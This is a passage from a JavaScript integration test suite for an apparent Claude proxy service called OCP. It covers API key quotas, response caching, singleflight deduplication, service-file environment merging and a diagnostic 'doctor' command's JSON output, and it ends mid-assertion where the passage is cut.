#!/usr/bin/env node
/**
 * Integration test for Quota + Cache features.
 * Tests database layer functions directly — no server needed.
 */
// MUST come before keys.mjs: redirects the key store to a scratch dir (see test-env.mjs).
import { TEST_OCP_DIR } from "./test-env.mjs";
import { getDb, getDbPath, createKey, listKeys, validateKey, recordUsage, checkQuota, updateKeyQuota, getKeyQuota, findKey, cacheHash, getCachedResponse, setCachedResponse, clearCache, getCacheStats, closeDb, hasCacheControl, singleflight, getInflightStats } from "./keys.mjs";
import { isLoopbackBind } from "./lib/net.mjs";
import { createSerialMutex, createTtlCache, isTokenExpiring, orderLabelsLastGoodFirst } from "./lib/spawn-auth.mjs";
import { createHash } from "node:crypto";
import { strict as assert } from "node:assert";
import { join } from "node:path";
import { pathToFileURL } from "node:url";
import { execFileSync, spawnSync } from "node:child_process";
import { homedir } from "node:os";

process.env.HOME = homedir(); // normalize HOME so homedir()-derived paths are stable across shells

// The scaffolding that used to live here CLAIMED to use "a test database to avoid corrupting
// real data" by setting an env var before the first getDb(). It never worked: keys.mjs read no
// env var, and ESM hoisting meant the assignment ran after the import anyway. The redirect is
// now real, and lives in test-env.mjs (imported above, before keys.mjs). This test proves it.

let passed = 0;
let failed = 0;

// Pending promises from tests declared `async` but registered through the SYNC `test()` helper.
// 44 tests in this file are written that way. Before this, `test()` called fn(), got a promise back,
// and immediately printed ✓ and incremented `passed` — WITHOUT AWAITING IT. So for every async test:
//   - ✓ meant "did not throw synchronously", NOT "passed";
//   - a failed assertion escaped as an unhandled rejection, which crashes the process (CI still goes
//     red on the non-zero exit) but is NOT counted, so the summary could print "N passed, 0 failed"
//     and be wrong.
// The suite's own headline number was therefore not evidence for any async test — including the
// regression guards in this PR. Collected here and awaited before the summary prints.
const pendingAsync = [];

function test(name, fn) {
  try {
    const r = fn();
    if (r && typeof r.then === "function") {
      // Async body: settle it before counting. Do NOT print ✓ yet.
      pendingAsync.push(
        r.then(
          () => { passed++; console.log(`  ✓ ${name}`); },
          (e) => { failed++; console.log(`  ✗ ${name}: ${e.message}`); },
        ),
      );
      return;
    }
    passed++;
    console.log(`  ✓ ${name}`);
  } catch (e) {
    failed++;
    console.log(`  ✗ ${name}: ${e.message}`);
  }
}

async function testAsync(name, fn) {
  try {
    await fn();
    passed++;
    console.log(`  ✓ ${name}`);
  } catch (e) {
    failed++;
    console.log(`  ✗ ${name}: ${e.message}`);
  }
}

console.log("\n=== OCP Feature Tests (Quota + Cache) ===\n");

// Initialize DB
const db = getDb();

// ── Quota Tests ──
console.log("Quota:");

const key1 = createKey("test-user-1");
const key2 = createKey("test-user-2");

test("createKey returns id, key, name", () => {
  assert.ok(key1.id);
  assert.ok(key1.key.startsWith("ocp_"));
  assert.equal(key1.name, "test-user-1");
});

test("listKeys includes quota fields", () => {
  const keys = listKeys();
  assert.ok(keys.length >= 2);
  const k = keys.find(k => k.name === "test-user-1");
  assert.ok("quota_daily" in k);
  assert.ok("quota_weekly" in k);
  assert.ok("quota_monthly" in k);
  assert.equal(k.quota_daily, null);
});

test("checkQuota returns null when no quota set", () => {
  const result = checkQuota(key1.id, key1.name);
  assert.equal(result, null);
});

test("checkQuota returns null for null keyId", () => {
  assert.equal(checkQuota(null, "anon"), null);
  assert.equal(checkQuota(undefined, "anon"), null);
});

test("updateKeyQuota sets daily quota (partial update)", () => {
  const ok = updateKeyQuota(key1.id, { daily: 5 });
  assert.ok(ok);
  const quota = getKeyQuota(key1.id);
  assert.equal(quota.daily.limit, 5);
  assert.equal(quota.weekly.limit, null); // not touched
  assert.equal(quota.monthly.limit, null);
});

test("updateKeyQuota partial update preserves existing values", () => {
  updateKeyQuota(key1.id, { weekly: 20 });
  const quota = getKeyQuota(key1.id);
  assert.equal(quota.daily.limit, 5);  // preserved from previous call
  assert.equal(quota.weekly.limit, 20);
});

test("checkQuota passes when under limit", () => {
  // Record 3 usages (limit is 5 daily)
  for (let i = 0; i < 3; i++) {
    recordUsage({ keyId: key1.id, keyName: key1.name, model: "sonnet", promptChars: 100, responseChars: 50, elapsedMs: 1000, success: true });
  }
  const result = checkQuota(key1.id, key1.name);
  assert.equal(result, null);
});

test("checkQuota returns exceeded when at limit", () => {
  // Record 2 more to hit limit (3 + 2 = 5)
  for (let i = 0; i < 2; i++) {
    recordUsage({ keyId: key1.id, keyName: key1.name, model: "sonnet", promptChars: 100, responseChars: 50, elapsedMs: 1000, success: true });
  }
  const result = checkQuota(key1.id, key1.name);
  assert.ok(result);
  assert.equal(result.period, "daily");
  assert.equal(result.limit, 5);
  assert.equal(result.used, 5);
  assert.ok(result.resetsIn);
});

test("checkQuota ignores failed requests in count", () => {
  // key2 has quota of 2 daily
  updateKeyQuota(key2.id, { daily: 2 });
  recordUsage({ keyId: key2.id, keyName: key2.name, model: "sonnet", promptChars: 100, responseChars: 0, elapsedMs: 500, success: false });
  recordUsage({ keyId: key2.id, keyName: key2.name, model: "sonnet", promptChars: 100, responseChars: 50, elapsedMs: 1000, success: true });
  const result = checkQuota(key2.id, key2.name);
  assert.equal(result, null); // only 1 successful, limit is 2
});

test("getKeyQuota returns correct used counts", () => {
  const quota = getKeyQuota(key1.id);
  assert.equal(quota.daily.used, 5);
  assert.equal(quota.daily.limit, 5);
});

test("findKey works by id and name", () => {
  const byId = findKey(String(key1.id));
  assert.ok(byId);
  assert.equal(byId.name, "test-user-1");
  const byName = findKey("test-user-1");
  assert.ok(byName);
  // Compare by name since auto-increment IDs may vary across runs
  assert.equal(byName.name, "test-user-1");
  assert.equal(findKey("nonexistent"), null);
});

// ── Cache Tests ──
console.log("\nCache:");

// Clean slate for cache tests
clearCache();

const msgs1 = [{ role: "user", content: "Hello world" }];
const msgs2 = [{ role: "user", content: "Different prompt" }];

test("cacheHash is deterministic", () => {
  const h1 = cacheHash("sonnet", msgs1);
  const h2 = cacheHash("sonnet", msgs1);
  assert.equal(h1, h2);
});

test("cacheHash differs for different models", () => {
  const h1 = cacheHash("sonnet", msgs1);
  const h2 = cacheHash("opus", msgs1);
  assert.notEqual(h1, h2);
});

test("cacheHash differs for different messages", () => {
  const h1 = cacheHash("sonnet", msgs1);
  const h2 = cacheHash("sonnet", msgs2);
  assert.notEqual(h1, h2);
});

test("cacheHash includes temperature in hash", () => {
  const h1 = cacheHash("sonnet", msgs1, {});
  const h2 = cacheHash("sonnet", msgs1, { temperature: 0.5 });
  const h3 = cacheHash("sonnet", msgs1, { temperature: 1.0 });
  assert.notEqual(h1, h2);
  assert.notEqual(h2, h3);
});

// ── configEpoch (#176): a boot-config change must invalidate the persistent cache ──
// Mutation-proof: drop the `ce:` fold in keys.mjs and the first test goes green-to-red.
test("cacheHash: different configEpoch → different key (config change invalidates)", () => {
  const h1 = cacheHash("sonnet", msgs1, { configEpoch: "aaaa000011112222" });
  const h2 = cacheHash("sonnet", msgs1, { configEpoch: "bbbb000011112222" });
  assert.notEqual(h1, h2);
});

test("cacheHash: same configEpoch is stable; absent epoch hashes byte-identically to pre-#176", () => {
  const e1 = cacheHash("sonnet", msgs1, { configEpoch: "aaaa000011112222" });
  const e2 = cacheHash("sonnet", msgs1, { configEpoch: "aaaa000011112222" });
  assert.equal(e1, e2);
  // absent-epoch calls (older callers, all pre-existing tests) must not change behavior
  assert.equal(cacheHash("sonnet", msgs1, {}), cacheHash("sonnet", msgs1));
  assert.notEqual(e1, cacheHash("sonnet", msgs1), "epoch-carrying key differs from legacy key");
});

test("cacheHash includes max_tokens in hash", () => {
  const h1 = cacheHash("sonnet", msgs1, {});
  const h2 = cacheHash("sonnet", msgs1, { max_tokens: 100 });
  assert.notEqual(h1, h2);
});

test("getCachedResponse returns null for miss", () => {
  const hash = cacheHash("sonnet", msgs1);
  const result = getCachedResponse(hash, 3600000);
  assert.equal(result, null);
});

test("setCachedResponse + getCachedResponse roundtrip", () => {
  const hash = cacheHash("sonnet", msgs1);
  setCachedResponse(hash, "sonnet", "Hello! I am Claude.");
  const result = getCachedResponse(hash, 3600000);
  assert.ok(result);
  assert.equal(result.response, "Hello! I am Claude.");
  assert.equal(result.hits, 1);
});

test("getCachedResponse increments hit counter", () => {
  const hash = cacheHash("sonnet", msgs1);
  const r1 = getCachedResponse(hash, 3600000);
  const r2 = getCachedResponse(hash, 3600000);
  assert.equal(r1.hits, 2);
  assert.equal(r2.hits, 3);
});

test("getCachedResponse respects TTL (expired entry)", () => {
  // Insert a backdated cache entry directly
  const d = getDb();
  const oldHash = "test_expired_hash_12345";
  d.prepare("INSERT OR REPLACE INTO response_cache (hash, model, response, created_at) VALUES (?, ?, ?, datetime('now', '-2 hours'))").run(oldHash, "sonnet", "Old response");
  // TTL of 1 hour should not return a 2-hour-old entry
  const result = getCachedResponse(oldHash, 3600000);
  assert.equal(result, null);
  // Clean up the backdated entry so it doesn't affect subsequent tests
  d.prepare("DELETE FROM response_cache WHERE hash = ?").run(oldHash);
});

test("getCacheStats returns correct counts", () => {
  const stats = getCacheStats();
  assert.equal(stats.entries, 1);
  assert.ok(stats.totalHits >= 3);
  assert.ok(stats.sizeBytes > 0);
});

test("setCachedResponse upserts on conflict", () => {
  const hash = cacheHash("sonnet", msgs1);
  setCachedResponse(hash, "sonnet", "Updated response!");
  const result = getCachedResponse(hash, 3600000);
  assert.equal(result.response, "Updated response!");
  assert.equal(result.hits, 1); // reset after upsert
});

test("clearCache removes all entries", () => {
  // Add another entry
  const hash2 = cacheHash("sonnet", msgs2);
  setCachedResponse(hash2, "sonnet", "Another response");
  const statsBefore = getCacheStats();
  assert.equal(statsBefore.entries, 2);

  const cleared = clearCache();
  assert.equal(cleared, 2);

  const statsAfter = getCacheStats();
  assert.equal(statsAfter.entries, 0);
});

test("clearCache with TTL only removes old entries", () => {
  // Add fresh entry
  const hash = cacheHash("sonnet", msgs1);
  setCachedResponse(hash, "sonnet", "Fresh response");

  // Clear with TTL of 1 hour — fresh entry should survive
  const cleared = clearCache(3600000);
  assert.equal(cleared, 0);

  const stats = getCacheStats();
  assert.equal(stats.entries, 1);

  // Clean up
  clearCache();
});

// ── PR-A: Per-key isolation (D1), cache_control bypass (D2), chunked replay (D3) ──
console.log("\nPR-A Cache Upgrade:");

const msgsBase = [{ role: "user", content: "Shared prompt text" }];

test("D1: cacheHash with two distinct keyIds produces different hashes", () => {
  const h1 = cacheHash("sonnet", msgsBase, { keyId: "key-aaa" });
  const h2 = cacheHash("sonnet", msgsBase, { keyId: "key-bbb" });
  assert.notEqual(h1, h2);
});

test("D1: cacheHash with keyId=undefined and keyId='anon' produce the same hash", () => {
  const hUndef = cacheHash("sonnet", msgsBase, { keyId: undefined });
  const hAnon  = cacheHash("sonnet", msgsBase, { keyId: "anon" });
  assert.equal(hUndef, hAnon);
});

test("D1: cacheHash with keyId=null and keyId='anon' produce the same hash", () => {
  const hNull = cacheHash("sonnet", msgsBase, { keyId: null });
  const hAnon = cacheHash("sonnet", msgsBase, { keyId: "anon" });
  assert.equal(hNull, hAnon);
});

test("D1: v2 prefix — hash differs from a v1-style baseline (no prefix)", () => {
  // Reproduce a v1-style hash manually to confirm v2 differs
  const v1 = createHash("sha256")
    .update("sonnet")
    .update(msgsBase[0].role)
    .update(msgsBase[0].content)
    .digest("hex");
  const v2 = cacheHash("sonnet", msgsBase, { keyId: "anon" });
  assert.notEqual(v1, v2);
});

test("D1: cacheHash is reproducible for same keyId (determinism)", () => {
  const h1 = cacheHash("sonnet", msgsBase, { keyId: "key-xyz" });
  const h2 = cacheHash("sonnet", msgsBase, { keyId: "key-xyz" });
  assert.equal(h1, h2);
});

test("D2: hasCacheControl returns true for top-level cache_control on message", () => {
  const msgs = [{ role: "user", cache_control: { type: "ephemeral" }, content: "hello" }];
  assert.equal(hasCacheControl(msgs), true);
});

test("D2: hasCacheControl returns true for nested cache_control in content array", () => {
  const msgs = [{ role: "user", content: [{ type: "text", text: "x", cache_control: { type: "ephemeral" } }] }];
  assert.equal(hasCacheControl(msgs), true);
});

test("D2: hasCacheControl returns false for plain string content", () => {
  const msgs = [{ role: "user", content: "plain string" }];
  assert.equal(hasCacheControl(msgs), false);
});

test("D2: hasCacheControl returns false for content array without cache_control", () => {
  const msgs = [{ role: "user", content: [{ type: "text", text: "x" }] }];
  assert.equal(hasCacheControl(msgs), false);
});

test("D2: hasCacheControl handles null/empty input gracefully", () => {
  assert.equal(hasCacheControl(null), false);
  assert.equal(hasCacheControl([]), false);
  assert.equal(hasCacheControl([null, undefined]), false);
});

// D3: chunked stream replay — verify the logic by simulating what server.mjs does
test("D3: 160-char cached response produces 2 chunks at 80 codepoints/chunk", () => {
  const content = "a".repeat(160);
  const CACHE_REPLAY_CHUNK_SIZE = 80;
  const codepoints = Array.from(content);
  const chunks = [];
  for (let i = 0; i < codepoints.length; i += CACHE_REPLAY_CHUNK_SIZE) {
    chunks.push(codepoints.slice(i, i + CACHE_REPLAY_CHUNK_SIZE).join(""));
  }
  assert.equal(chunks.length, 2);
  assert.equal(chunks[0].length, 80);
  assert.equal(chunks[1].length, 80);
});

test("D3: chunked replay uses Array.from — multibyte codepoints stay intact", () => {
  // Each Chinese character is 1 codepoint but 3 UTF-8 bytes
  const chinese = "你好世界".repeat(25); // 100 codepoints
  const CACHE_REPLAY_CHUNK_SIZE = 80;
  const codepoints = Array.from(chinese);
  const chunks = [];
  for (let i = 0; i < codepoints.length; i += CACHE_REPLAY_CHUNK_SIZE) {
    chunks.push(codepoints.slice(i, i + CACHE_REPLAY_CHUNK_SIZE).join(""));
  }
  assert.equal(chunks.length, 2);
  assert.equal(Array.from(chunks[0]).length, 80);
  assert.equal(Array.from(chunks[1]).length, 20);
  // Verify each character is a complete codepoint (no mojibake)
  for (const chunk of chunks) {
    for (const cp of Array.from(chunk)) {
      assert.equal(cp.length <= 2, true); // surrogate pairs are length 2, single chars length 1
    }
  }
});

// ── PR-B Singleflight tests (async) ──
async function asyncTest(name, fn) {
  try {
    await fn();
    passed++;
    console.log(`  ✓ ${name}`);
  } catch (e) {
    failed++;
    console.log(`  ✗ ${name}: ${e.message}`);
  }
}

async function runSingleflightTests() {
  console.log("\nPR-B Singleflight:");

  // 1. Basic dedup: 10 concurrent calls with same hash execute fn only once.
  await asyncTest("basic dedup: 10 concurrent callers execute fn only once", async () => {
    let callCount = 0;
    const fn = () => new Promise(resolve => {
      callCount++;
      setTimeout(() => resolve("result-A"), 20);
    });
    const results = await Promise.all(Array.from({ length: 10 }, () => singleflight("sf-dedup-1", fn)));
    assert.equal(callCount, 1, `fn called ${callCount} times, expected 1`);
    assert.ok(results.every(r => r === "result-A"), "all 10 callers should receive the same return value");
  });

  // 2. Failure fan-out: all followers reject when leader rejects.
  await asyncTest("failure fan-out: all followers reject with leader error", async () => {
    let callCount = 0;
    const fn = () => new Promise((_, reject) => {
      callCount++;
      setTimeout(() => reject(new Error("upstream-fail")), 20);
    });
    const promises = Array.from({ length: 10 }, () => singleflight("sf-fail-1", fn));
    const results = await Promise.allSettled(promises);
    assert.equal(callCount, 1, `fn called ${callCount} times, expected 1`);
    assert.ok(results.every(r => r.status === "rejected"), "all 10 should be rejected");
    assert.ok(results.every(r => r.reason?.message === "upstream-fail"), "all should share the same error message");
  });

  // 3a. Map cleanup after success: inflight count returns to 0 after promise resolves.
  await asyncTest("map cleanup after success: inflight=0 after promise settles", async () => {
    const fn = () => new Promise(resolve => setTimeout(() => resolve("done"), 10));
    await singleflight("sf-cleanup-ok", fn);
    const stats = getInflightStats();
    assert.equal(stats.inflight, 0, `expected inflight=0 after settlement, got ${stats.inflight}`);
  });

  // 3b. Map cleanup after failure: inflight count returns to 0 after promise rejects.
  await asyncTest("map cleanup after failure: inflight=0 after promise rejects", async () => {
    const fn = () => new Promise((_, reject) => setTimeout(() => reject(new Error("fail")), 10));
    try { await singleflight("sf-cleanup-fail", fn); } catch {}
    const stats = getInflightStats();
    assert.equal(stats.inflight, 0, `expected inflight=0 after rejection, got ${stats.inflight}`);
  });

  // 4. Different hashes don't share: two parallel calls with distinct hashes both execute.
  await asyncTest("different hashes do not share a singleflight entry", async () => {
    let countA = 0;
    let countB = 0;
    const fnA = () => new Promise(resolve => { countA++; setTimeout(() => resolve("A"), 20); });
    const fnB = () => new Promise(resolve => { countB++; setTimeout(() => resolve("B"), 20); });
    const [rA, rB] = await Promise.all([singleflight("sf-hash-A", fnA), singleflight("sf-hash-B", fnB)]);
    assert.equal(countA, 1);
    assert.equal(countB, 1);
    assert.equal(rA, "A");
    assert.equal(rB, "B");
  });

  // 5. getInflightStats shape: returns { inflight: number, requesters: number }.
  await asyncTest("getInflightStats returns correct shape", async () => {
    // Verify shape against a settled state (inflight=0 is still the right shape).
    const stats = getInflightStats();
    assert.equal(typeof stats.inflight, "number", "inflight should be a number");
    assert.equal(typeof stats.requesters, "number", "requesters should be a number");
    // Also verify live counts: start a pending fn, check inflight>0, then resolve.
    const { promise: blocker, resolve: resolveBlocker } = Promise.withResolvers();
    const fn = () => blocker;
    const p = singleflight("sf-stats-shape", fn);
    const liveStats = getInflightStats();
    assert.ok(liveStats.inflight >= 1, `expected inflight>=1, got ${liveStats.inflight}`);
    resolveBlocker("ok");
    await p;
  });

  // 6. Sequential calls don't share: singleflight is for concurrent dedup only.
  await asyncTest("sequential calls with same hash each execute fn independently", async () => {
    let callCount = 0;
    const fn = () => new Promise(resolve => { callCount++; setTimeout(() => resolve(callCount), 10); });
    const r1 = await singleflight("sf-sequential", fn);
    const r2 = await singleflight("sf-sequential", fn);
    assert.equal(callCount, 2, `fn should have been called twice, got ${callCount}`);
    assert.equal(r1, 1);
    assert.equal(r2, 2);
  });

  // 7. M1: leader disconnect while queued must not poison live followers. server.mjs passes
  // retryIf = (err) => err instanceof RequestDisconnectedError && !res.destroyed — here we
  // model that with a tagged error class. The leader (no retryIf on its own promise — the
  // rejection is ITS OWN disconnect) sees the error; the live follower re-executes its OWN
  // fn and gets a real result instead of a spurious inherited failure.
  await asyncTest("M1: leader disconnects while queued → live follower re-executes and gets a real result", async () => {
    class FakeDisconnectError extends Error {}
    const leaderGate = Promise.withResolvers();
    let leaderRuns = 0;
    let followerRuns = 0;
    const leaderFn = async () => { leaderRuns++; await leaderGate.promise; throw new FakeDisconnectError("leader client gone"); };
    const followerFn = async () => { followerRuns++; return "real-execution"; };
    const retryIf = (err) => err instanceof FakeDisconnectError;

    const leaderP = singleflight("sf-m1-leader-dc", leaderFn);             // becomes leader
    const followerP = singleflight("sf-m1-leader-dc", followerFn, retryIf); // joins as follower
    leaderGate.resolve(); // leader "disconnects" while holding the flight

    await assert.rejects(leaderP, FakeDisconnectError, "the leader itself still sees its own disconnect");
    assert.equal(await followerP, "real-execution", "follower got a REAL execution, not the leader's disconnect");
    assert.equal(leaderRuns, 1, "leader fn ran once");
    assert.equal(followerRuns, 1, "follower re-executed exactly once (as the new leader)");
    assert.equal(getInflightStats().inflight, 0, "map fully cleaned up after the retry flight settles");
  });

  // 8. M1 guard: a follower whose retryIf returns false (server.mjs: its OWN client is also
  // gone) inherits the rejection unchanged — no retry, no masked error. And a follower with
  // NO retryIf keeps the exact pre-M1 share-everything behavior (test 2 pins the fan-out;
  // this pins the predicate=false path specifically for the disconnect error).
  await asyncTest("M1: follower with retryIf=false (own client also gone) inherits the leader's rejection, no retry", async () => {
    class FakeDisconnectError extends Error {}
    const gate = Promise.withResolvers();
    let followerRuns = 0;
    const leaderFn = async () => { await gate.promise; throw new FakeDisconnectError("leader client gone"); };
    const followerFn = async () => { followerRuns++; return "should-never-run"; };

    const leaderP = singleflight("sf-m1-both-dc", leaderFn);
    const followerP = singleflight("sf-m1-both-dc", followerFn, () => false); // own client dead → no retry
    gate.resolve();

    await assert.rejects(leaderP, FakeDisconnectError);
    await assert.rejects(followerP, FakeDisconnectError, "rejection propagates unchanged when retryIf says no");
    assert.equal(followerRuns, 0, "follower fn never executed — no wasted spawn for a dead client");
    assert.equal(getInflightStats().inflight, 0);
  });
}

await runSingleflightTests();

// ── Plist Env Merge Tests ──
import { mergePlistEnv, mergeSystemdEnv, NEVER_PRESERVE } from "./scripts/lib/plist-merge.mjs";

console.log("\nPlist env merge:");

const SAMPLE_TEMPLATE_PLIST = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>dev.ocp.proxy</string>
  <key>EnvironmentVariables</key>
  <dict>
    <key>CLAUDE_PROXY_PORT</key>
    <string>3478</string>
    <key>CLAUDE_BIND</key>
    <string>127.0.0.1</string>
    <key>CLAUDE_AUTH_MODE</key>
    <string>multi</string>
  </dict>
</dict>
</plist>`;

const SAMPLE_EXISTING_PLIST = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>dev.ocp.proxy</string>
  <key>EnvironmentVariables</key>
  <dict>
    <key>CLAUDE_PROXY_PORT</key>
    <string>3456</string>
    <key>CLAUDE_BIND</key>
    <string>127.0.0.1</string>
    <key>CLAUDE_AUTH_MODE</key>
    <string>none</string>
    <key>CLAUDE_HEARTBEAT_INTERVAL</key>
    <string>2000</string>
    <key>CLAUDE_CACHE_TTL</key>
    <string>600</string>
  </dict>
</dict>
</plist>`;

test("mergePlistEnv preserves unknown user keys", () => {
  const merged = mergePlistEnv(SAMPLE_EXISTING_PLIST, SAMPLE_TEMPLATE_PLIST);
  assert.match(merged, /<key>CLAUDE_HEARTBEAT_INTERVAL<\/key>\s*<string>2000<\/string>/);
  assert.match(merged, /<key>CLAUDE_CACHE_TTL<\/key>\s*<string>600<\/string>/);
});

test("mergePlistEnv overrides known template keys", () => {
  const merged = mergePlistEnv(SAMPLE_EXISTING_PLIST, SAMPLE_TEMPLATE_PLIST);
  assert.match(merged, /<key>CLAUDE_PROXY_PORT<\/key>\s*<string>3478<\/string>/);
  assert.match(merged, /<key>CLAUDE_AUTH_MODE<\/key>\s*<string>multi<\/string>/);
});

test("mergePlistEnv first-install returns template unchanged when existing is null", () => {
  const merged = mergePlistEnv(null, SAMPLE_TEMPLATE_PLIST);
  assert.equal(merged, SAMPLE_TEMPLATE_PLIST);
});

test("mergePlistEnv first-install returns template unchanged when existing is empty", () => {
  const merged = mergePlistEnv("", SAMPLE_TEMPLATE_PLIST);
  assert.equal(merged, SAMPLE_TEMPLATE_PLIST);
});

const SAMPLE_TEMPLATE_SYSTEMD = `[Unit]
Description=OCP — Open Claude Proxy
After=network.target

[Service]
ExecStart=/usr/bin/node /home/u/ocp/server.mjs
Environment=CLAUDE_PROXY_PORT=3478
Environment=CLAUDE_BIND=127.0.0.1
Environment=CLAUDE_AUTH_MODE=multi
Restart=always
`;

const SAMPLE_EXISTING_SYSTEMD = `[Unit]
Description=OCP — Open Claude Proxy
After=network.target

[Service]
ExecStart=/usr/bin/node /home/u/ocp/server.mjs
Environment=CLAUDE_PROXY_PORT=3456
Environment=CLAUDE_BIND=127.0.0.1
Environment=CLAUDE_AUTH_MODE=none
Environment=CLAUDE_HEARTBEAT_INTERVAL=2000
Environment=CLAUDE_CACHE_TTL=600
Restart=always
`;

test("mergeSystemdEnv preserves unknown user Environment lines", () => {
  const merged = mergeSystemdEnv(SAMPLE_EXISTING_SYSTEMD, SAMPLE_TEMPLATE_SYSTEMD);
  assert.match(merged, /Environment=CLAUDE_HEARTBEAT_INTERVAL=2000/);
  assert.match(merged, /Environment=CLAUDE_CACHE_TTL=600/);
});

test("mergeSystemdEnv overrides known template keys", () => {
  const merged = mergeSystemdEnv(SAMPLE_EXISTING_SYSTEMD, SAMPLE_TEMPLATE_SYSTEMD);
  assert.match(merged, /Environment=CLAUDE_PROXY_PORT=3478/);
  assert.match(merged, /Environment=CLAUDE_AUTH_MODE=multi/);
});

test("mergeSystemdEnv first-install returns template unchanged", () => {
  assert.equal(mergeSystemdEnv(null, SAMPLE_TEMPLATE_SYSTEMD), SAMPLE_TEMPLATE_SYSTEMD);
  assert.equal(mergeSystemdEnv("", SAMPLE_TEMPLATE_SYSTEMD), SAMPLE_TEMPLATE_SYSTEMD);
});

test("mergePlistEnv is idempotent", () => {
  const r1 = mergePlistEnv(SAMPLE_EXISTING_PLIST, SAMPLE_TEMPLATE_PLIST);
  assert.equal(mergePlistEnv(r1, SAMPLE_TEMPLATE_PLIST), r1);
});

// ── A4: security denylist — test-only key-store redirection vars must NEVER survive a setup
// re-run, even when a prior unit already carried them. Mutation-proof: drop the
// `!NEVER_PRESERVE.has(k)` guard in either merge fn and these fail (the vars get preserved).
test("NEVER_PRESERVE denylists exactly the two key-store redirection vars", () => {
  assert.ok(NEVER_PRESERVE.has("NODE_ENV") && NEVER_PRESERVE.has("OCP_DIR_OVERRIDE"));
  assert.equal(NEVER_PRESERVE.size, 2, "exactly two — a new entry needs its own rationale + test");
});

const PLIST_EXISTING_WITH_TEST_VARS = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>dev.ocp.proxy</string>
  <key>EnvironmentVariables</key>
  <dict>
    <key>CLAUDE_PROXY_PORT</key>
    <string>3456</string>
    <key>CLAUDE_CACHE_TTL</key>
    <string>600</string>
    <key>NODE_ENV</key>
    <string>test</string>
    <key>OCP_DIR_OVERRIDE</key>
    <string>/tmp/scratch-store</string>
  </dict>
</dict>
</plist>`;

test("mergePlistEnv strips test-only redirection vars (A4) but keeps legit user keys", () => {
  const merged = mergePlistEnv(PLIST_EXISTING_WITH_TEST_VARS, SAMPLE_TEMPLATE_PLIST);
  assert.match(merged, /<key>CLAUDE_CACHE_TTL<\/key>\s*<string>600<\/string>/, "a legit user key is still preserved");
  assert.doesNotMatch(merged, /<key>NODE_ENV<\/key>/, "NODE_ENV must never reach a service unit");
  assert.doesNotMatch(merged, /OCP_DIR_OVERRIDE/, "OCP_DIR_OVERRIDE must never reach a service unit (key or value)");
});

test("mergePlistEnv: an existing unit whose ONLY extras are denylisted → template unchanged", () => {
  const existing = `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
  <key>EnvironmentVariables</key>
  <dict>
    <key>CLAUDE_PROXY_PORT</key>
    <string>3456</string>
    <key>NODE_ENV</key>
    <string>test</string>
    <key>OCP_DIR_OVERRIDE</key>
    <string>/tmp/scratch-store</string>
  </dict>
</dict>
</plist>`;
  assert.equal(mergePlistEnv(existing, SAMPLE_TEMPLATE_PLIST), SAMPLE_TEMPLATE_PLIST, "nothing left to preserve → clean template");
});

const SYSTEMD_EXISTING_WITH_TEST_VARS = `[Unit]
Description=OCP — Open Claude Proxy

[Service]
ExecStart=/usr/bin/node /home/u/ocp/server.mjs
Environment=CLAUDE_PROXY_PORT=3456
Environment=CLAUDE_CACHE_TTL=600
Environment=NODE_ENV=test
Environment=OCP_DIR_OVERRIDE=/tmp/scratch-store
Restart=always
`;

test("mergeSystemdEnv strips test-only redirection vars (A4) but keeps legit user keys", () => {
  const merged = mergeSystemdEnv(SYSTEMD_EXISTING_WITH_TEST_VARS, SAMPLE_TEMPLATE_SYSTEMD);
  assert.match(merged, /Environment=CLAUDE_CACHE_TTL=600/, "a legit user key is still preserved");
  assert.doesNotMatch(merged, /Environment=NODE_ENV=/, "NODE_ENV must never reach a service unit");
  assert.doesNotMatch(merged, /OCP_DIR_OVERRIDE/, "OCP_DIR_OVERRIDE must never reach a service unit");
});

test("mergeSystemdEnv is idempotent", () => {
  const r1 = mergeSystemdEnv(SAMPLE_EXISTING_SYSTEMD, SAMPLE_TEMPLATE_SYSTEMD);
  assert.equal(mergeSystemdEnv(r1, SAMPLE_TEMPLATE_SYSTEMD), r1);
});

// ── Doctor JSON Contract Tests ──
import { runDoctor } from "./scripts/doctor.mjs";

console.log("\nDoctor:");

test("doctor --json shape: required top-level keys", async () => {
  const result = await runDoctor({ skipNetwork: true, mockVersion: "v3.10.0", mockLatest: "v3.14.0" });
  for (const k of ["schema_version", "ready_to_upgrade", "current_version", "latest_version",
                   "from_version_supported", "fail_count", "warn_count", "checks", "next_action"]) {
    assert.ok(k in result, `missing key: ${k}`);
  }
  assert.equal(result.schema_version, "1");
});

test("doctor detects from-version < v3.4.0 → fresh_install", async () => {
  const result = await runDoctor({ skipNetwork: true, mockVersion: "v3.2.0", mockLatest: "v3.14.0" });
  assert.equal(result.from_version_supported, false);
  assert.equal(result.next_action.kind, "fresh_install");
  assert.ok(Array.isArray(result.next_action.ai_executable));
  assert.ok(result.next_action.ai_executable.length > 0);
});

test("doctor next_action.kind enum is one of allowed values", async () => {
  const result = await runDoctor({ skipNetwork: true, mockVersion: "v3.10.0", mockLatest: "v3.14.0" });
  const ALLOWED = ["noop", "restart", "update", "upgrade", "fresh_install", "fix_oauth", "fix_service"];
  assert.ok(ALLOWED.includes(result.next_action.kind), `kind=${result.next_action.kind} not in enum`);
});

// #226 premise-check: a first install genuinely must enable + start the service (that IS its
// job) — only scripts/upgrade.mjs's reconfigure phase should opt into --reconfigure-only.
// This guards against the flag's use accidentally spreading to fresh_install's real command.
test("doctor fresh_install's setup.mjs step does NOT carry --reconfigure-only (first install must enable+start)", async () => {
  const result = await runDoctor({ skipNetwork: true, mockVersion: "v3.2.0", mockLatest: "v3.14.0" });
  assert.equal(result.next_action.kind, "fresh_install");
  const setupStep = result.next_action.ai_executable.find(c => c.includes("setup.mjs"));
  assert.ok(setupStep, "fresh_install ai_executable must include a setup.mjs step");
  assert.ok(!setupStep.includes("--reconfigure-only"),
